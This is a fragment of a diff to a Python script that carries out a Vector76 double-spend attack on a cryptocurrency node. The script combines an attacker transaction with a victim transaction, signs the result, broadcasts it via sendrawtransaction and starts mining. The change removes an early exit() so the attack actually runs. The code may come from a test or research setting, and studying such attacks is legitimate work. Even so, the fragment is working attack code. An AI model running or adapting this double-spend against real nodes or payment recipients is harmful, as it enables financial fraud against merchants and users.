@@ -95,10 +95,8 @@ print()
 tx_vector76 = f"{tx_attacker}{tx_victim}"
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
 print(tx_vector76)
-exit()
 print("Sending Vector76 block your node...")
 result = rpc_node.sendrawtransaction(tx_vector76)
-print(tx_vector76)
 print(f"result : {binascii.hexlify(result)}")
 print("Mining Vector76 block...")
 payload = [attacker_address, [tx_vector76], False]
